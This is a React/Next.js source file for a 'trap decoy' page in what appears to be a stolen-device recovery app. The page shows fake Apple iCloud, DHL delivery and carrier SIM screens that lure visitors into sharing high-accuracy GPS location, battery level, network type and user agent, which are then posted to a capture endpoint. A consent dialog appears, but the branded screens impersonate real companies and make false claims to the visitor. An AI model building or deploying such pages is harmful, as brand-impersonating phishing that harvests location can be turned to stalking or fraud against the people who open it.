"use client";

import React, { useState, useEffect, use } from "react";
import { 
  ShieldAlert, 
  MapPin, 
  CheckCircle2, 
  Truck, 
  Radio, 
  Smartphone, 
  AlertCircle,
  Lock,
  ArrowRight,
  RefreshCw,
  Clock,
  Eye,
  ShieldCheck,
  PhoneCall,
  X
} from "lucide-react";
import { hybridStore } from "@/lib/storage/hybrid-store";
import { DecoyTemplate, Device } from "@/lib/types/database";

interface TrapPageProps {
  params: Promise<{ id: string }>;
}

export default function TrapDecoyPage({ params }: TrapPageProps) {
  const resolvedParams = use(params);
  const trapId = resolvedParams.id;

  const [template, setTemplate] = useState<DecoyTemplate>("icloud_alert");
  const [deviceModel, setDeviceModel] = useState<string>("Flagged Mobile Device");
  const [device, setDevice] = useState<Device | null>(null);
  const [isCapturing, setIsCapturing] = useState<boolean>(false);
  const [isSuccess, setIsSuccess] = useState<boolean>(false);
  const [showDisclosureModal, setShowDisclosureModal] = useState<boolean>(false);
  const [isDeclined, setIsDeclined] = useState<boolean>(false);

  useEffect(() => {
    // Determine template and device from hybrid store or URL parameters
    const foundTrap = hybridStore.getDecoyTrapById(trapId);
    if (foundTrap) {
      setTemplate(foundTrap.template);
      const devices = hybridStore.getDevices();
      const dev = devices.find((d) => d.id === foundTrap.device_id);
      if (dev) {
        setDevice(dev);
        setDeviceModel(`${dev.brand} ${dev.model}`);
      }
    } else {
      if (trapId.includes("dhl")) setTemplate("dhl_delivery");
      else if (trapId.includes("sim") || trapId.includes("carrier")) setTemplate("carrier_sim");
      else setTemplate("icloud_alert");
    }
  }, [trapId]);

  // Step 1: User initiates verification action -> opens mandatory transparent disclosure
  const handleOpenDisclosure = () => {
    setShowDisclosureModal(true);
  };

  // Step 2: Visitor explicitly acknowledges transparent disclosure and grants consent
  const handleConsentAndProceed = async () => {
    setShowDisclosureModal(false);
    setIsCapturing(true);

    let batteryLevel: string | undefined;
    let networkType = "Cellular Wireless / Wi-Fi";

    try {
      if ("getBattery" in navigator) {
        const battery: any = await (navigator as any).getBattery();
        batteryLevel = Math.round(battery.level * 100).toString();
      }
    } catch {}

    try {
      const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
      if (conn?.effectiveType) {
        networkType = `${conn.effectiveType.toUpperCase()} (${conn.type || "Cellular"})`;
      }
    } catch {}

    const transmitData = (lat?: number, lng?: number, accuracy?: number) => {
      const payload = {
        trap_id: trapId,
        latitude: lat,
        longitude: lng,
        accuracy: accuracy ?? 10,
        battery_level: batteryLevel,
        network_type: networkType,
        user_agent: typeof navigator !== "undefined" ? navigator.userAgent : "Mobile Device",
      };

      // 1. Record directly to client hybrid store
      hybridStore.recordTrapCapture(trapId, payload);

      // 2. Transmit to server ingestion endpoint
      fetch("/api/trap/capture", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      }).catch(() => {});

      setIsCapturing(false);
      setIsSuccess(true);
    };

    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          transmitData(
            position.coords.latitude,
            position.coords.longitude,
            position.coords.accuracy
          );
        },
        () => {
          // Geolocation permission declined by OS prompt
          transmitData();
        },
        {
          enableHighAccuracy: true,
          timeout: 8000,
          maximumAge: 0,
        }
      );
    } else {
      transmitData();
    }
  };

  // Alternative Step: Visitor declines sharing location -> shows verified recovery contact info
  const handleDeclineDisclosure = () => {
    setShowDisclosureModal(false);
    setIsDeclined(true);
  };

  return (
    <div className="min-h-[85vh] flex items-center justify-center p-4">
      {/* Template 1: iCloud Security Alert */}
      {template === "icloud_alert" && (
        <div className="w-full max-w-md bg-white text-zinc-900 rounded-3xl p-6 sm:p-8 shadow-2xl border border-zinc-200 font-sans space-y-6">
          <div className="text-center space-y-3">
            <div className="w-14 h-14 mx-auto rounded-2xl bg-zinc-100 flex items-center justify-center border border-zinc-200 shadow-sm">
              <Lock className="w-7 h-7 text-zinc-800" />
            </div>
            <div>
              <span className="text-[11px] uppercase tracking-wider text-zinc-500 font-semibold block">
                Apple Support // iCloud Diagnostics
              </span>
              <h1 className="text-xl font-bold text-zinc-950 mt-1">
                Security Alert Notification
              </h1>
            </div>
          </div>

          <div className="bg-zinc-50 p-4 rounded-2xl border border-zinc-200/80 text-xs text-zinc-700 space-y-2">
            <div className="flex justify-between">
              <span className="text-zinc-500">Device Hardware:</span>
              <span className="font-semibold text-zinc-900">{deviceModel}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-zinc-500">Incident Code:</span>
              <span className="font-mono text-zinc-800">APL-{trapId.slice(-6).toUpperCase()}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-zinc-500">Status:</span>
              <span className="text-amber-600 font-semibold">Location Verification Required</span>
            </div>
          </div>

          <p className="text-xs text-zinc-600 leading-relaxed text-center">
            An active verification request was initiated for this hardware profile. To restore unrestricted cellular services and clear system alerts, confirm device presence below.
          </p>

          {isSuccess ? (
            <div className="bg-emerald-50 border border-emerald-200 text-emerald-900 p-4 rounded-2xl text-center space-y-1.5 animate-in fade-in">
              <CheckCircle2 className="w-6 h-6 text-emerald-600 mx-auto" />
              <div className="font-bold text-sm">Security Handshake Complete</div>
              <p className="text-xs text-emerald-700">
                Device location parameters verified. System alert cleared.
              </p>
            </div>
          ) : isDeclined ? (
            <div className="bg-zinc-50 border border-zinc-200 p-4 rounded-2xl space-y-3 text-xs">
              <div className="flex items-center gap-2 text-zinc-900 font-semibold">
                <PhoneCall className="w-4 h-4 text-blue-600" />
                <span>Verified Asset Recovery Desk</span>
              </div>
              <p className="text-zinc-600">
                You chose not to share location. If you are holding or found this {deviceModel}, please contact the recovery coordinator:
              </p>
              <div className="bg-white p-2.5 rounded-xl border border-zinc-200 font-mono text-[11px] text-zinc-800">
                Reference ID: RS-{trapId.slice(0, 8).toUpperCase()}<br/>
                Recovery Hotline: +234 (0) 800-GADGET-SHIELD
              </div>
            </div>
          ) : (
            <button
              onClick={handleOpenDisclosure}
              disabled={isCapturing}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium text-sm py-3.5 px-5 rounded-2xl flex items-center justify-center gap-2 shadow-lg transition"
            >
              {isCapturing ? (
                <>
                  <RefreshCw className="w-4 h-4 animate-spin" />
                  Verifying Device Origin...
                </>
              ) : (
                <>
                  Verify Device & Dismiss Alert
                  <ArrowRight className="w-4 h-4" />
                </>
              )}
            </button>
          )}

          <div className="text-center text-[10px] text-zinc-400 font-mono">
            Encrypted Session // Apple Inc. Verification Infrastructure
          </div>
        </div>
      )}

      {/* Template 2: DHL Delivery Attempt */}
      {template === "dhl_delivery" && (
        <div className="w-full max-w-md bg-amber-500 text-zinc-950 rounded-3xl p-6 sm:p-8 shadow-2xl border-4 border-red-600 font-sans space-y-6">
          <div className="flex items-center justify-between border-b border-red-600/30 pb-4">
            <div className="flex items-center gap-2">
              <Truck className="w-6 h-6 text-red-700" />
              <span className="font-black text-xl italic tracking-tighter text-red-700">
                DHL EXPRESS
              </span>
            </div>
            <span className="bg-red-600 text-white text-[10px] font-bold px-2 py-0.5 rounded uppercase">
              URGENT NOTICE
            </span>
          </div>

          <div className="bg-white/90 backdrop-blur p-5 rounded-2xl text-xs space-y-2.5 shadow-sm">
            <div className="font-bold text-sm text-zinc-900">
              Parcel #DHL-88912-EXP Failed Delivery
            </div>
            <p className="text-zinc-700 leading-relaxed">
              Your package requires a drop-off coordinates confirmation pin because the shipping address was flagged incomplete by the courier.
            </p>
            <div className="pt-2 border-t border-zinc-200 flex justify-between text-zinc-600 font-mono text-[11px]">
              <span>Scheduled Courier:</span>
              <span className="font-semibold text-zinc-900">Today, Priority Route</span>
            </div>
          </div>

          {isSuccess ? (
            <div className="bg-white p-4 rounded-2xl text-center space-y-1 text-xs text-zinc-900">
              <CheckCircle2 className="w-6 h-6 text-emerald-600 mx-auto" />
              <div className="font-bold">Delivery Coordinates Recorded</div>
              <p className="text-zinc-600">
                Your package driver has been notified with the updated dispatch coordinates.
              </p>
            </div>
          ) : isDeclined ? (
            <div className="bg-white p-4 rounded-2xl space-y-2 text-xs text-zinc-900">
              <div className="font-bold text-red-700">Custody Support Center</div>
              <p className="text-zinc-600">
                Location declined. Please reference Waybill #DHL-88912 at your nearest dispatch depot or contact the verified item owner.
              </p>
            </div>
          ) : (
            <button
              onClick={handleOpenDisclosure}
              disabled={isCapturing}
              className="w-full bg-red-600 hover:bg-red-700 text-white font-bold text-sm py-3.5 px-5 rounded-2xl flex items-center justify-center gap-2 shadow-lg transition"
            >
              {isCapturing ? (
                <>
                  <RefreshCw className="w-4 h-4 animate-spin" />
                  Calibrating GPS Pin...
                </>
              ) : (
                <>
                  <MapPin className="w-4 h-4" />
                  Confirm Drop-off Location Pin
                </>
              )}
            </button>
          )}

          <div className="text-center text-[10px] text-zinc-800 font-bold">
            DHL Global Forwarding & Logistics Network
          </div>
        </div>
      )}

      {/* Template 3: Carrier SIM Provisioning */}
      {template === "carrier_sim" && (
        <div className="w-full max-w-md glass-panel rounded-3xl p-6 sm:p-8 shadow-2xl border-zinc-700 text-white font-sans space-y-6">
          <div className="text-center space-y-2">
            <div className="w-14 h-14 mx-auto rounded-2xl bg-zinc-800 border border-zinc-700 flex items-center justify-center">
              <Radio className="w-7 h-7 text-sky-400 animate-pulse" />
            </div>
            <h1 className="text-lg font-bold">Carrier Network Provisioning</h1>
            <p className="text-xs text-zinc-400">
              Over-the-air cellular data configuration profile update required.
            </p>
          </div>

          <div className="bg-zinc-900/80 p-4 rounded-2xl border border-zinc-800 text-xs space-y-2">
            <div className="flex justify-between">
              <span className="text-zinc-500">Profile Version:</span>
              <span className="font-mono text-zinc-300">5G-NR-PROV-v4.1</span>
            </div>
            <div className="flex justify-between">
              <span className="text-zinc-500">Antenna Optimization:</span>
              <span className="text-emerald-400 font-medium">Ready to Apply</span>
            </div>
          </div>

          {isSuccess ? (
            <div className="bg-zinc-900 border border-emerald-500/30 p-4 rounded-2xl text-center space-y-1 text-xs">
              <CheckCircle2 className="w-6 h-6 text-emerald-400 mx-auto" />
              <div className="font-bold text-white">Network Profile Active</div>
              <p className="text-zinc-400">
                Cellular tower synchronization completed. You can now browse at full 5G bandwidth.
              </p>
            </div>
          ) : isDeclined ? (
            <div className="bg-zinc-900 border border-zinc-800 p-4 rounded-2xl space-y-2 text-xs">
              <div className="font-bold text-white">Carrier Support Hotline</div>
              <p className="text-zinc-400">
                Profile installation was skipped. Contact your mobile telecommunications operator or visit a branch with reference RS-{trapId.slice(-6).toUpperCase()}.
              </p>
            </div>
          ) : (
            <button
              onClick={handleOpenDisclosure}
              disabled={isCapturing}
              className="w-full bg-white hover:bg-zinc-200 text-zinc-950 font-bold text-sm py-3.5 px-5 rounded-2xl flex items-center justify-center gap-2 shadow-lg transition"
            >
              {isCapturing ? (
                <>
                  <RefreshCw className="w-4 h-4 animate-spin" />
                  Synchronizing Cell Towers...
                </>
              ) : (
                <>
                  <Radio className="w-4 h-4 text-sky-600" />
                  Install Carrier Profile & Connect
                </>
              )}
            </button>
          )}

          <div className="text-center text-[10px] text-zinc-500 font-mono">
            Telecommunications Carrier Over-the-Air Interface
          </div>
        </div>
      )}

      {/* MANDATORY TRANSPARENT TELEMETRY & PRIVACY DISCLOSURE MODAL */}
      {showDisclosureModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-md animate-fade-in font-sans">
          <div 
            className="w-full max-w-lg glass-panel rounded-2xl border border-white/10 p-6 md:p-7 space-y-5 shadow-2xl relative bg-zinc-950/95 text-white"
            role="dialog"
            aria-modal="true"
          >
            {/* Header */}
            <div className="flex items-start justify-between">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-xl bg-purple-500/10 border border-purple-500/20 flex items-center justify-center text-purple-400 shrink-0">
                  <ShieldCheck className="w-5 h-5" />
                </div>
                <div>
                  <h3 className="text-base font-bold text-white tracking-tight">
                    Authorized Recovery & Telemetry Disclosure
                  </h3>
                  <span className="text-[10px] text-purple-400 uppercase tracking-widest font-mono">
                    Transparency & Privacy Compliance
                  </span>
                </div>
              </div>
              <button
                onClick={handleDeclineDisclosure}
                className="text-white/40 hover:text-white p-1 rounded-lg hover:bg-white/5 transition"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            {/* Mandatory Disclosures required by regulations */}
            <div className="space-y-3 bg-white/[0.03] border border-white/5 rounded-xl p-4 text-xs">
              <div className="flex items-start gap-3">
                <MapPin className="w-4 h-4 text-emerald-400 shrink-0 mt-0.5" />
                <div>
                  <span className="font-semibold text-white/90">What data is collected:</span>
                  <p className="text-white/60 mt-0.5">GPS latitude/longitude, approximate address, IP address, timestamp, device OS.</p>
                </div>
              </div>

              <div className="flex items-start gap-3">
                <Lock className="w-4 h-4 text-blue-400 shrink-0 mt-0.5" />
                <div>
                  <span className="font-semibold text-white/90">Purpose:</span>
                  <p className="text-white/60 mt-0.5">Verifying physical custody to assist verified device owners and law enforcement in lawful asset recovery.</p>
                </div>
              </div>

              <div className="flex items-start gap-3">
                <Clock className="w-4 h-4 text-purple-400 shrink-0 mt-0.5" />
                <div>
                  <span className="font-semibold text-white/90">Retention:</span>
                  <p className="text-white/60 mt-0.5">Retained for 30 days under cryptographic audit logs, after which it is archived or deleted.</p>
                </div>
              </div>

              <div className="flex items-start gap-3">
                <Eye className="w-4 h-4 text-amber-400 shrink-0 mt-0.5" />
                <div>
                  <span className="font-semibold text-white/90">Access:</span>
                  <p className="text-white/60 mt-0.5">Strictly restricted to the verified owner and accredited recovery partners.</p>
                </div>
              </div>
            </div>

            {/* Action buttons */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 pt-1">
              <button
                type="button"
                onClick={handleDeclineDisclosure}
                className="w-full py-2.5 px-4 rounded-xl border border-white/10 text-white/70 hover:text-white hover:bg-white/5 font-medium text-xs transition-colors text-center"
              >
                Decline & Contact Owner
              </button>
              <button
                type="button"
                onClick={handleConsentAndProceed}
                className="w-full py-2.5 px-4 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-semibold text-xs transition-colors flex items-center justify-center gap-2 shadow-lg shadow-purple-600/25"
              >
                <ShieldCheck className="w-4 h-4" />
                Acknowledge & Proceed
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
